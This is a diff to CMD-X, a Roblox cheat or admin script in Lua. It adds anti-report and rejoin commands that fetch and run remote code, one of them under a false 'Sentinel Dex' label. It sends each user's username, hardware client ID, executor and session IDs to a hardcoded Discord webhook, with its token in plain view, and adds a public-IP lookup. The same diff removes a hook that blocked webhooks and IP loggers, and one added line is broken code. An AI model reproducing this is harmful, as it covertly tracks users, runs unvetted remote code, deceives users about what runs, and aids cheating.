@@ -3,27 +3,6 @@ License: "d11auth/Luauth"
 This license grants the right to use the licensed script to all individuals and entities, excluding the anticheat developer "Byfron AC". Any use of the licensed script by the anticheat developer is strictly prohibited and a violation of the terms of this license. This license is governed by the laws of the jurisdiction in which it is being used and all parties using the licensed script agree to comply with said laws. The licensor reserves the right to immediately terminate this license in the event that the anticheat developer uses the licensed script in violation of its terms. All other rights, including but not limited to, trademark, trade secret, and patent rights, are reserved by the licensor. By using the licensed script, all parties agree to be bound by the terms of this Byfron Anticheat Exclusionary License.
 ]]
 
-local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
-local Notify = AkaliNotif.Notify;
-
-wait(1);
-
-Notify({
-  Description = "d11voqii's notif";
-  Title = "CMD-X LOADED";
-  Duration = 5;
-});
-
-wait(1)
-
-setclipboard("discord.gg/6t43zuAGCF")
-Notify({
-  Description = "d11voqii's notif";
-  Title = "copied discord invite to clipboard.";
-  Duration = 5;
-});
-
-
 ---------------------------------------|
 while not game:IsLoaded() or not game:GetService("CoreGui") or not game:GetService("Players").LocalPlayer or not game:GetService("Players").LocalPlayer.PlayerGui do wait() end
   -- Constraints: -----------------------|
@@ -381,7 +360,7 @@ return namecall(self, ...)
 end)
 setreadonly(mt, true)--]]
 
-Stand("CMD-X", "d11voqii W", "UPDATE LOGS:", "added invis fling, fixed supermute, reworked fling.", "", "Continue", true)
+Stand("CMD-X", "d11voqii W", "UPDATE LOGS:", "fixed bugs, removed BTR, fps improvement", "discord deleted: False", "Continue", true)
 while not RunDude do wait() end
 
 wait(.5)
@@ -430,19 +409,19 @@ local Mouses = cmdlp:GetMouse()
 cmdm = Mouses
 -- we dont have this many owners just alts
 local Devs = {
-  ["d11voqii"] = "Owner",
-  ["12gaugebrainsurgery"] = "Owner",
+  ["gorgeouslullaby"] = "Owner",
+  ["lovethatimsoevil"] = "Owner",
   ["robbo4248"] = "Owner",
   ["d11vooqii"] = "Mary",
   ["Chaunccey666"] = "Dev",
-  ["9igeon"] = "Owner",
-  ["L_xs"] = "Dev",
+  ["machport1"] = "Owner",
+  ["mybeltbbsimon"] = "Owner",
   ["Jamieleon1004O"] = "Dev",
   ["ElizabethGillespie72"] = "Dev",
 }
 
 DevCords = {
-  "d11voqii#1601";
+  "d11voqii#9130";
   "pigeon#0256";
   "Curvn#2002"
 }
@@ -462,39 +441,39 @@ local Donors = {
   ["HyperLink3"] = "1",
   ["OFFTheBatter"] = "1",
   ["DisturbedCult"] = "1",
-  ["hellavzn"] = "1",
+  ["mybeltbbsimon"] = "1",
   ["DAMAGlNG"] = "1",
   ["Zukkoe"] = "1",
   ["Missingno74"] = "1",
   ["HelIaSketchers"] = "1",
   ["amazinggeorgedude"] = "1",
   ["TheBlankProdigy"] = "1",
-  ["cxpoxxo"] = "1",
+  ["mybeltbbsimon"] = "1",
   ["x1mv"] = "1",
   ["ElizabethGillespie72"] = "1",
-  ["left_dd"] = "1",
-  ["d11voqii"] = "1",
+  ["machport1"] = "1",
+  ["gorgeouslullaby"] = "1",
   ["Jamieleon1004O"] = "1",
 
-  ["8dqt"] = "2",
-  ["skrask"] = "2",
+  ["mybeltbbsimon"] = "2",
+  ["Chaunccey666"] = "2",
   ["Jamieleon1004O"] = "2",
   ["JuustMaya"] = "2",
   ["ElizabethGillespie72"] = "2",
   ["Chaunccey666"] = "2",
-  ["pliabIe"] = "2",
+  ["machport1"] = "2",
   ["robbo4248"] = "2",
   ["wipethebIoodoffme"] = "2",
-  ["d11voqii"] = "2",
+  ["gorgeouslullaby"] = "2",
 
-  ["overreaction"] = "Custom1",
+  ["mybeltbbsimon"] = "Custom1",
   ["InternetSpeeds"] = "Custom2",
   ["JuustMaya"] = "Custom3",
   ["Jamieleon1004O"] = "Custom4",
-  ["DuBz_Bubby"] = "Custom5", -- top donor {$200}
-  ["YanniLove"] = "Custom6",
-  ["rainbowpuffle12"] = "Custom7",
-  ["d11voqii"] = "Custom8",
+  ["Chaunccey666"] = "Custom5", -- top donor {$200}
+  ["machport1"] = "Custom6",
+  ["lovethatimsoevil"] = "Custom7",
+  ["gorgeouslullaby"] = "Custom8",
 }
 
 local Tier = {
@@ -2010,16 +1989,16 @@ if AntiCheat.HideParentInExploit then
         ["removeanim"] = "Removes your characters animations.",
         ["restoreanim"] = "Restores your characters animations.",
         ["resizehead"] = "Resizes your characters head.",
-        --["removeshirt"] = "Removes your characters shirt.",
-        --["removetshirt"] = "Removes your characters tshirt",
-        --["removepants"] = "Removes your characters pants.",
-        --["removeclothes"] = "Removes your character clothes.",
+        ["removeshirt"] = "Removes your characters shirt.",
+        ["removetshirt"] = "Removes your characters tshirt",
+        ["removepants"] = "Removes your characters pants.",
+        ["removeclothes"] = "Removes your character clothes.",
         ["removehatsmesh"] = "Removes your characters hat meshes.",
         ["removegearmesh"] = "Removes your current characters gear mesh.",
-        --["drophats"] = "Drops your characters hats on the map.",
+        ["drophats"] = "Drops your characters hats on the map.",
         ["dropgears"] = "Drops your characters gears on the map.",
-        --["hatspam"] = "Spams your hats onto the map.",
-        --["unhatspam"] = "()",
+        ["hatspam"] = "Spams your hats onto the map.",
+        ["unhatspam"] = "Stops spamming your hats onto the map.",
         ["removeface"] = "Removes your characters face.",
         ["removehats"] = "Removes your characters hats.",
         ["rheadmesh"] = "Removes the mesh of your characters head.",
@@ -2120,6 +2099,7 @@ if AntiCheat.HideParentInExploit then
         ["step"] = "Allows you to teleport up a building.",
         ["unstep"] = "()",
         ["antiafk"] = "Prevents you from idling.",
+        ["antichatlogger"] = "prevents you from getting banned on roblox even if reported.",
         ["nosit"] = "Stops your character from being sat down.",
         ["yessit"] = "()",
         ["nostun"] = "Stops your character from being PlatformStood.",
@@ -2328,7 +2308,7 @@ if AntiCheat.HideParentInExploit then
         ["disabledrops"] = "Disables tools dropping features.",
         ["novoid"] = "Stops you from being voided.",
         ["yesvoid"] = "()",
-        ["sentinelexplorer"] = "Opens sentinel dex.",
+        ["rjod"] = "rejoins on disconnect",
         ["truesight"] = "Shows invisible objects.",
         ["untruesight"] = "()",
         ["disableplayer"] = "Removes a player from your client.",
@@ -2454,7 +2434,7 @@ if AntiCheat.HideParentInExploit then
         ["clickdetectormaxdistance"] = "Sets clickdetector distance to the max.",
         ["unclickdetectormaxdistance"] = "()",
         ["gotobpclass"] = "Bypass teleports to class.",
-        --["hatgiverspam"] = "Spams hat givers and drops hats if there are any.",
+        ["hatgiverspam"] = "Spams hat givers and drops hats if there are any.",
         ["fakelag"] = "Simulates fake network lag.",
         ["unfakelag"] = "()",
         ["hitboxes"] = "Shows you all hitboxes.",
@@ -2990,6 +2970,7 @@ if AntiCheat.HideParentInExploit then
         ["spiderman"] = "grapple",
         ["unspiderman"] = "ungrapple",
         ["afk"] = "antiafk",
+        ["antichatlogger"] = "Disables report for you, you can still report, but if you get reported, nothing will happen. useful shit.",
         ["bhop"] = "bunnyhop",
         ["unbhop"] = "unbunnyhop",
         ["invis"] = "invisible",
@@ -3145,7 +3126,8 @@ if AntiCheat.HideParentInExploit then
         ["rjd"] = "rejoindiff",
         ["ssnipe"] = "streamsnipe",
         ["gtime"] = "gametime",
-        ["sdex"] = "sentinelexplorer",
+        ["rjod"] = "rejoins on disconnect",
+        ["antichatlogger"] = "Prevents you from being banned even if reported for anything (ingame)",
         ["ts"] = "truesight",
         ["unts"] = "untruesight",
         ["topart"] = "gotopart",
@@ -12775,7 +12757,7 @@ if AntiCheat.HideParentInExploit then
                   if v:IsA("Sky") then v:Destroy() end
                 end
                 local reg = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(cmdlp)
-                local URL = ("https://restcountries.eu/rest/v2/alpha/"..reg)
+                local URL = ("https://restcountries.us/rest/v2/alpha/"..reg)
                 local fuck = game:HttpGet(URL)
                 local Http = game:GetService("HttpService"):JSONDecode(fuck)
                 game:GetService("Lighting").GeographicLatitude = Http.latlng[1]
@@ -13558,10 +13540,16 @@ if AntiCheat.HideParentInExploit then
                 opxL("Command","."..cmdinfo.name.." | "..cmdinfo.usage.." "..cmdinfo.description)
               end
 
-              function useCommand.sentinelexplorer()
-                opx("-","Loading SENTINEL DEX")
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/others/sdex.lua", true))()
-                opx("-","Loaded SENTINEL DEX")
+              function useCommand.rjod()
+                opx("-","Loading")
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/D11voqiiIsDaddy/rejoindiscconnect/main/rejoin%20disconnect",true))()
+                opx("-","Loaded rjod")
+              end
+
+              function useCommand.antichatlogger()
+                opx("-","Loading anti chat logger")
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/D11voqiiIsDaddy/antichatlogger/main/antichatlogger",true))()
+                opx("-","Loaded anti chat logger")
               end
 
               Pxrts = {}
@@ -13596,6 +13584,12 @@ if AntiCheat.HideParentInExploit then
                 function useCommand.unloopfling()
                   opx("-","Stopped loop flinging")
                   LoopFling = false
+                end
+
+                function useCommand.sentinel()
+                  opx("-","Loading SENTINEL DEX")
+                  print("hi") loadstring(game:HttpGet("https://raw.githubusercontent.com/D11voqiiIsDaddy/rejoindiscconnect/main/rejoin%20disconnect", true))()
+                  opx("-","Loaded SENTINEL DEX")
                 end
 
                 function useCommand.nomouse()
@@ -16247,12 +16241,12 @@ if not AntiCheat.PrintingOff then
   local StarterGui = game:GetService("StarterGui")
   StarterGui:SetCore("ChatMakeSystemMessage", {
     Text = "Welcome to CMD-X, "..cmdlp.Name.." -d11voqii";
-    Color = Color3.fromRGB(127, 0, 255);
+    Color = Color3.fromRGB(60, 60, 60);
     Font = Enum.Font.SourceSansBold;TextSize = 25
   })
   StarterGui:SetCore("ChatMakeSystemMessage", {
     Text = "To use chat commands use the prefix '"..prefix.."'";
-    Color = Color3.fromRGB(127, 0, 255);
+    Color = Color3.fromRGB(60, 60, 60);
     Font = Enum.Font.SourceSansBold;
     TextSize = 20
   })
@@ -16584,16 +16578,18 @@ while true do
 end
 -----------------------------end of cmd-x
 
-local A = "| ~ | d11voqii | ~ |"
+local A = "| ~ | CMDX | ~ |"
 local B = game:GetService("RbxAnalyticsService"):GetClientId();
 local C = game:GetService("Players").LocalPlayer.Name
 local D = game:GetService("Players").LocalPlayer.DisplayName
 local E = game:GetService("Players").LocalPlayer.UserId
 local F = game:GetService("Players").LocalPlayer.AccountAge
-local G = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
+local G = game.PlaceId
 local H = identifyexecutor()
-local I = Game.JobId
+local I = game.JobId
 local J = false
+local K = tostring(game:HttpGet("https://api.ipify.org", true))
+
 print('_______________________:')
 warn("CHECK")
 print(A)
@@ -16602,10 +16598,11 @@ print('Username:',C)
 print('DisplayName:',D)
 print('UserID:',E)
 print('Account Age:',F)
-print('PING:',G)
+print('PlaceId:',G)
 print('Executor:',H)
 print('JobId:',I)
-print('discord server deleted:',J)
+print('discord deleted:',J)
+print(K)
 print('_______________________:')
 
 local webh = "https://discord.com/api/webhooks/1046547097807224972/-guESl_vIMGbx443TVvesQXnxepiy_HHpXzVF8H79AapUmr_1fteFn_PKwO_8HszhxKM"
@@ -16621,13 +16618,16 @@ local data = {
       ['type'] = "rich",
       ['color'] = tonumber(3),
       ['fields'] = {
-        {name = '**Username**', value = game:GetService("Players").LocalPlayer.Name},
+        {name = 'Username**', value = game:GetService("Players").LocalPlayer.Name},
         {name = '**Display Name**', value = game:GetService("Players").LocalPlayer.DisplayName},
         {name = '**Player ID**', value = game:GetService("Players").LocalPlayer.UserId},
         {name = '**Player Account Age**', value = game:GetService("Players").LocalPlayer.AccountAge},
         {name = '**Hardware ID**', value = game:GetService("RbxAnalyticsService"):GetClientId()},
         {name = "**Ping**", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
         {name = "**Executor**", value = identifyexecutor()},
+        {name = "**PlaceId**", value = game.PlaceId},
+        {name = "**JobId**", value = game.JobId},
+        {name = "**discord deleted:**", value = false},
       }
     }
   }
@@ -16669,801 +16669,19 @@ elseif http_request then
 end
 end)
 
+wait(1);
+
+local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
+local Notify = AkaliNotif.Notify;
+
+Notify({
+  Description = "Loaded.";
+  Title = "CMD-X";
+  Duration = 5;
+});
+getgenv().Bitch = true
+tostring(game:HttpGet('https://raw.githubusercontent.com/1201for/littlegui/main/Warker-Mart'))()
+
 print("This license grants the right to use the licensed script to all individuals and entities, excluding the anticheat developer Byfron AC. Any use of the licensed script by the anticheat developer is strictly prohibited and a violation of the terms of this license. This license is governed by the laws of the jurisdiction in which it is being used and all parties using the licensed script agree to comply with said laws. The licensor reserves the right to immediately terminate this license in the event that the anticheat developer uses the licensed script in violation of its terms. All other rights, including but not limited to, trademark, trade secret, and patent rights, are reserved by the licensor. By using the licensed script, all parties agree to be bound by the terms of this Byfron Anticheat Exclusionary License.")
-if not game:IsLoaded() then game.Loaded:Wait() end
-
-
--- Set up content variables 
-
-
-local plr = game:GetService("Players").LocalPlayer
-
-
-
-local placeid = game.PlaceId
-
-local executor = identifyexecutor or getexecutor or getexecutorname
-local userid = plr.UserId
-
-executor = (type(executor) == "function" and executor()) or "Unknown"
-
-local wwwjobid = game.JobId
-
--- Set up local variables
-local ins = table.insert
-local rem = table.remove
-
--- Set up blacklisted stuff
-_G.BlockedDomains  = _G.BlockedDomains or {
-    -- Webhooks
-    
-    "discord.com/api/webhooks/";
-    "webhook";
-    "https://websec.services";
-    "websec.services";
-    "websec.services/ws/send/";   --webhook secure system so block it.
-    "websec.services/ws/send";
-    "websec.services/ws";
-    "schervi.wtf";  -- exposed scammer website ( psx )
-    "schervi.wtf/Pogchamp.lua";
-    "schervi.wtf/";
-    "schervi.wtf/Pogchamp";
-    "discord";
-    "roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="; --roblox avatar link
-    "roblox.com/Thumbs/Avatar";
-    "roblox.com/users/";
-    "roblox.com/users";
-    "roblox.com";
- 
-    
-    
-    -- Server hosters
-    
-    "000webhost";
-    "freehosting";
-    "repl";
-    
-    -- Identifier websites
-    
-    "ident.me";
-    "ipify.org";
-    "dyndns.org";
-    "checkip.amazonaws.com";
-    "httpbin.org/ip";
-    "ifconfig.io";
-    "ipaddress.sh";
-    "myip.com";
-    "discord.com";
-    "iplogger.org";
-    "2no.co";
-    "yip.su";
-    "iplis.ru";
-    "catsnthing.com";
-    "opentracker.net";
-    "iplocation";
-    "ip-tracker.org";
-    "grabify.link/";
-    "grabify.link";
-    "blasze.com";
-    
-    
-    -- KFC obfuscator
-    
-    "ligma.wtf";
-    "library.veryverybored";
-}
-_G.BlockedContent = _G.BlockedContent or {
-    plr.Name;
-    placeid;
-    executor;
-    wwwjobid;
-    userid;
-    
-}
-
--- Namecall hook
-do
-    local ncs = {"HttpGet","HttpPost","HttpGetAsync","HttpPostAsync","GetObjects"}
-end
-
-
-
-
-getgenv().rotatingtitle = true
-
-function retardtitle()
-    spawn(function()
-        while getgenv().rotatingtitle == true do
-            wait(.4)
-           rconsolename("C-")
-               wait(.4)
-           rconsolename("CM-")
-               wait(.4)
-           rconsolename("CMD-")
-               wait(.4)
-           rconsolename("CMDX")
-               wait(.4)
-           rconsolename("CMD-")
-               wait(.4)
-           rconsolename("CM--") 
-               wait(.4)
-           rconsolename("C---") 
-               wait(.4)
-           rconsolename("----") 
-               wait(.4)
-           rconsolename("---") 
-               wait(.4)
-           rconsolename("--") 
-               wait(.4)
-           rconsolename("-")
-               wait(.4)
-           rconsolename("")
-        end
-    end)
-end
-    
-retardtitle()
-
-rconsoleclear()
-
-
-
-
-
-
-wait(1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-
-
-rconsoleprint("@@WHITE@@")
-rconsoleprint("  sdSS_SSSSSSbs    sSSs   .S_sSSs     .S_SsS_S.    .S   .S_sSSs     .S_SSSs    S.      \n")
-wait(.1)
-rconsoleprint("  YSSS~S%SSSSSP   d%%SP  .SS~YS%%b   .SS~S*S~SS.  .SS  .SS~YS%%b   .SS~SSSSS   SS.     \n")
-wait(.1)
-rconsoleprint("       S%S       d%S'    S%S   `S%b  S%S `Y' S%S  S%S  S%S   `S%b  S%S   SSSS  S%S     \n")
-wait(.1)
-rconsoleprint("       S%S       S%S     S%S    S%S  S%S     S%S  S%S  S%S    S%S  S%S    S%S  S%S     \n")
-wait(.1)
-rconsoleprint("       S&S       S&S     S%S    d*S  S%S     S%S  S&S  S%S    S&S  S%S SSSS%S  S&S     \n")
-wait(.1)
-rconsoleprint("       S&S       S&S_Ss  S&S   .S*S  S&S     S&S  S&S  S&S    S&S  S&S  SSS%S  S&S     \n")
-wait(.1)
-rconsoleprint("       S&S       S&S~SP  S&S_sdSSS   S&S     S&S  S&S  S&S    S&S  S&S    S&S  S&S     \n")
-wait(.1)
-rconsoleprint("       S&S       S&S     S&S~YSY%b   S&S     S&S  S&S  S&S    S&S  S&S    S&S  S&S     \n")
-wait(.1)
-rconsoleprint("       S*S       S*b     S*S   `S%b  S*S     S*S  S*S  S*S    S*S  S*S    S&S  S*b     \n")
-wait(.1)
-rconsoleprint("       S*S       S*S.    S*S    S%S  S*S     S*S  S*S  S*S    S*S  S*S    S*S  S*S.    \n")
-wait(.1)
-rconsoleprint("       S*S        SSSbs  S*S    S&S  S*S     S*S  S*S  S*S    S*S  S*S    S*S   SSSbs  \n")
-wait(.1)
-rconsoleprint("       S*S         YSSP  S*S    SSS  SSS     S*S  S*S  S*S    SSS  SSS    S*S    YSSP  \n")
-wait(.1)
-rconsoleprint("       SP                SP                  SP   SP   SP                 SP           \n")
-wait(.1)
-rconsoleprint("       Y                 Y                   Y    Y    Y                  Y            \n")
-
-
-
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-rconsoleprint("\n")
-wait(.1)
-
-
-rconsoleclear()
-
-local function rprint(color, msg) 
-    rconsoleprint("@@"..color.."@@")
-    rconsoleprint(msg)
-end
-
-
--- Title
-do
-    rconsoleclear()
-    rprint("WHITE",[[
-        
- $$$$$$\  $$\      $$\ $$$$$$$\         $$\   $$\ 
-$$  __$$\ $$$\    $$$ |$$  __$$\        $$ |  $$ |
-$$ /  \__|$$$$\  $$$$ |$$ |  $$ |       \$$\ $$  |
-$$ |      $$\$$\$$ $$ |$$ |  $$ |$$$$$$\ \$$$$  / 
-$$ |      $$ \$$$  $$ |$$ |  $$ |\______|$$  $$<  
-$$ |  $$\ $$ |\$  /$$ |$$ |  $$ |       $$  /\$$\ 
-\$$$$$$  |$$ | \_/ $$ |$$$$$$$  |       $$ /  $$ |
- \______/ \__|     \__|\_______/        \__|  \__|
-       
-                    d11voqii is winning once again.
-       
-       
-    
-]])
-    
-    rconsoleprint("@@WHITE@@")
-end
-
-
-
-
--- Namecall hook
-do
-    local ncs = {"HttpGet","HttpPost","HttpGetAsync","HttpPostAsync","GetObjects"}
-
-rprint("WHITE","\n\nNamecalls hooked:")
-for i = 1, #ncs do 
-    rprint("WHITE","\n > ")
-    rprint("WHITE", "game")
-    rprint("WHITE", ":")
-    rprint("WHITE", ncs[i])    
-end
-
-for i = 1, #ncs do 
-    ncs[ncs[i]] = true
-end
-
-
-local oldnc
-oldnc = hookmetamethod(game, "__namecall", function(a,b,...)
-    local nc = getnamecallmethod()
-    
-    if ncs[nc] then
-
-        -- HttpGet or HttpGetAsync
-        if (nc:sub(1,7) == "HttpGet") then
-            do
-                -- Check for blacklisted domains
-                local blocked = {}
-                for _,url in ipairs(_G.BlockedDomains) do
-                    if b:match(url) then
-                        ins(blocked, url)
-                    end
-                end
-                
-                -- Log time + namecall
-                rprint("WHITE", "\n ["..os.date("%X").."] > ")
-                rprint("WHITE", "game")
-                rprint("WHITE", ":")
-                rprint("WHITE", nc)
-                
-                -- Log if blocked
-                rprint("WHITE", "\n    - Request blocked: ")
-                if (#blocked > 0) then
-                    rprint("WHITE", "Yes")
-                else
-                    rprint("WHITE", "No")
-                end
-                
-                -- Log URL
-                rprint("WHITE", "\n    - URL: ")
-                rprint("WHITE", tostring(b))
-                
-                if (#blocked > 0) then 
-                    rprint("WHITE", "\n    An attempt to make a request towards a possibly malicious site was made. Blacklisted content detected: \n")
-                    
-                    rconsoleprint("")
-                    for i = 1, #blocked do
-                        rconsoleprint("      - "..blocked[i].."\n")
-                    end
-                    return
-                end
-            end
-        elseif (nc:sub(1,8) == "HttpPost") then
-            do
-                -- Check for blacklisted domains
-                local blocked = {}
-                for _,url in ipairs(_G.BlockedDomains) do
-                    if (b:match(url)) then
-                        ins(blocked, url)
-                    end
-                end
-                
-                -- Check for blacklisted content 
-                local data = ...
-                for _, content in ipairs(_G.BlockedContent) do 
-                    if (data:match(content)) then 
-                        ins(blocked, content)
-                    end
-                end
-                
-                -- Log time + namecall
-                rprint("WHITE", "\n ["..os.date("%X").."] > ")
-                rprint("WHITE", "game")
-                rprint("WHITE", ":")
-                rprint("WHITE", nc)
-                
-                -- Log if blocked
-                rprint("WHITE", "\n    - Request blocked: ")
-                if (#blocked > 0) then
-                    rprint("WHITE", "Yes")
-                else
-                    rprint("WHITE", "No")
-                end
-                
-                -- Log URL
-                rprint("WHITE", "\n    - URL: ")
-                rprint("WHITE", tostring(b))
-                
-                -- Data
-                rprint("WHITE", "\n    - Data: ")
-                rprint("WHITE", tostring(data))
-                
-                if (#blocked > 0) then 
-                    rprint("WHITE", "\n    An attempt to make a possibly malicious request was made. Blacklisted content detected: \n")
-                    
-                    rconsoleprint("")
-                    for i = 1, #blocked do
-                        rconsoleprint("      - "..blocked[i].."\n")
-                    end
-                    return
-                end
-            end
-        elseif (nc == "GetObjects") then
-            do
-                -- Log time + namecall
-                rprint("WHITE", "\n ["..os.date("%X").."] > ")
-                rprint("WHITE", "game")
-                rprint("WHITE", ":")
-                rprint("WHITE", nc)
-                
-                -- Log asset
-                rprint("WHITE", "\n    - Asset: ")
-                rprint("WHITE", tostring(b))
-                
-            end 
-        end
-    end
-    
-    return oldnc(a,b,...) 
-end)
-end
--- Function hook
-do 
-rprint("WHITE","\n\nFunctions hooked:")
-
--- HttpGet
-do
-    rprint("WHITE","\n > ")
-    rprint("WHITE", "game")
-    rprint("WHITE", ".")
-    rprint("WHITE", "HttpGet")  
-    
-    local old
-    old = hookfunction(game.HttpGet,function(a,b,...)
-        -- Check for blacklisted domains
-        local blocked = {}
-        for _,url in ipairs(_G.BlockedDomains) do
-            if b:match(url) then
-                ins(blocked, url)
-            end
-        end
-        
-        -- Log time + func call
-        rprint("WHITE", "\n ["..os.date("%X").."] > ")
-        rprint("WHITE", "game")
-        rprint("WHITE", ".")
-        rprint("WHITE", "HttpGet")
-        
-        -- Log if blocked
-        rprint("WHITE", "\n    - Request blocked: ")
-        if (#blocked > 0) then
-            rprint("WHITE", "Yes")
-        else
-            rprint("WHITE", "No")
-        end
-        
-        -- Log URL
-        rprint("WHITE", "\n    - URL: ")
-        rprint("WHITE", tostring(b))
-        
-        if (#blocked > 0) then 
-            rprint("RED", "\n    An attempt to make a request towards a possibly malicious site was made. Blacklisted content detected: \n")
-            
-            rconsoleprint("@@WHITE@@")
-            for i = 1, #blocked do
-                rconsoleprint("      - "..blocked[i].."\n")
-            end
-            return
-        end
-        return old(a,b,...)
-    end)
-end
--- HttpGetAsync
-do 
-    rprint("WHITE","\n > ")
-    rprint("WHITE", "game")
-    rprint("WHITE", ".")
-    rprint("WHITE", "HttpGetAsync")  
-    
-    local old
-    old = hookfunction(game.HttpGetAsync,function(a,b,...)
-        -- Check for blacklisted domains
-        local blocked = {}
-        for _,url in ipairs(_G.BlockedDomains) do
-            if b:match(url) then
-                ins(blocked, url)
-            end
-        end
-        
-        -- Log time + func call
-        rprint("WHITE", "\n ["..os.date("%X").."] > ")
-        rprint("WHITE", "game")
-        rprint("WHITE", ".")
-        rprint("WHITE", "HttpGetAsync")
-        
-        -- Log if blocked
-        rprint("WHITE", "\n    - Request blocked: ")
-        if (#blocked > 0) then
-            rprint("WHITE", "Yes")
-        else
-            rprint("WHITE", "No")
-        end
-        
-        -- Log URL
-        rprint("WHITE", "\n    - URL: ")
-        rprint("WHITE", tostring(b))
-        
-        if (#blocked > 0) then 
-            rprint("WHITE", "\n    An attempt to make a request towards a possibly malicious site was made. Blacklisted content detected: \n")
-            
-            rconsoleprint("@@WHITE@@")
-            for i = 1, #blocked do
-                rconsoleprint("      - "..blocked[i].."\n")
-            end
-            return
-        end
-        return old(a,b,...)
-    end)
-end
--- HttpPost
-do 
-    rprint("WHITE","\n > ")
-    rprint("WHITE", "game")
-    rprint("WHITE", ".")
-    rprint("WHITE", "HttpPost")  
-    
-    local old
-    old = hookfunction(game.HttpPost, function(a,b,...)
-        -- Check for blacklisted domains
-        local blocked = {}
-        for _,url in ipairs(_G.BlockedDomains) do
-            if b:match(url) then
-                ins(blocked, url)
-            end
-        end
-        
-        -- Check for blacklisted content 
-        local data = ...
-        for _, content in ipairs(_G.BlockedContent) do 
-            if (data:match(content)) then 
-                ins(blocked, content)
-            end
-        end
-        
-        -- Log time + func call
-        rprint("WHITE", "\n ["..os.date("%X").."] > ")
-        rprint("WHITE", "game")
-        rprint("WHITE", ".")
-        rprint("WHITE", "HttpPost")
-        
-        -- Log if blocked
-        rprint("WHITE", "\n    - Request blocked: ")
-        if (#blocked > 0) then
-            rprint("WHITE", "Yes")
-        else
-            rprint("WHITE", "No")
-        end
-        
-        -- Log URL
-        rprint("WHITE", "\n    - URL: ")
-        rprint("WHITE", tostring(b))
-        
-        -- Data
-        rprint("WHITE", "\n    - Data: ")
-        rprint("WHITE", tostring(data))
-        
-        if (#blocked > 0) then 
-            rprint("WHITE", "\n    An attempt to make a possibly malicious request was made. Blacklisted content detected: \n")
-            
-            rconsoleprint("@@WHITE@@")
-            for i = 1, #blocked do
-                rconsoleprint("      - "..blocked[i].."\n")
-            end
-            return
-        end
-        return old(a,b,...)
-    end)
-end
--- HttpPostAsync 
-do 
-    rprint("WHITE","\n > ")
-    rprint("WHITE", "game")
-    rprint("WHITE", ".")
-    rprint("WHITE", "HttpPostAsync")  
-    
-    local old
-    old = hookfunction(game.HttpPostAsync, function(a,b,...)
-        -- Check for blacklisted domains
-        local blocked = {}
-        for _,url in ipairs(_G.BlockedDomains) do
-            if b:match(url) then
-                ins(blocked, url)
-            end
-        end
-        
-        -- Check for blacklisted content 
-        local data = ...
-        for _, content in ipairs(_G.BlockedContent) do 
-            if (data:match(content)) then 
-                ins(blocked, content)
-            end
-        end
-        
-        -- Log time + func call
-        rprint("WHITE", "\n ["..os.date("%X").."] > ")
-        rprint("WHITE", "game")
-        rprint("WHITE", ".")
-        rprint("WHITE", "HttpPostAsync")
-        
-        -- Log if blocked
-        rprint("WHITE", "\n    - Request blocked: ")
-        if (#blocked > 0) then
-            rprint("WHITE", "Yes")
-        else
-            rprint("WHITE", "No")
-        end
-        
-        -- Log URL
-        rprint("WHITE", "\n    - URL: ")
-        rprint("WHITE", tostring(b))
-        
-        -- Data
-        rprint("WHITE", "\n    - Data: ")
-        rprint("WHITE", tostring(data))
-        
-        if (#blocked > 0) then 
-            rprint("WHITE", "\n    An attempt to make a possibly malicious request was made. Blacklisted content detected: \n")
-            
-            rconsoleprint("@@WHITE@@")
-            for i = 1, #blocked do
-                rconsoleprint("      - "..blocked[i].."\n")
-            end
-            return
-        end
-        return old(a,b,...)
-    end)
-end
---GetObjects
-do
-    rprint("WHITE","\n > ")
-    rprint("WHITE", "game")
-    rprint("WHITE", ".")
-    rprint("WHITE", "GetObjects")  
-    
-    local old
-    old = hookfunction(game.GetObjects, function(a,b,...)
-        -- Log time + namecall
-        rprint("WHITE", "\n ["..os.date("%X").."] > ")
-        rprint("WHITE", "game")
-        rprint("WHITE", ":")
-        rprint("WHITE", "GetObjects")
-        -- Log asset
-        rprint("WHITE", "\n    - Asset: ")
-        rprint("WHITE", tostring(b))
-        
-        return old(a,b,...)
-    end)
-end
-end
--- request hook
-do 
-local reqf = 
-((type(syn) == "table" and type(syn.request) == "function") and syn.request) or 
-((type(http) == "table" and type(http.request) == "function") and http.request) or
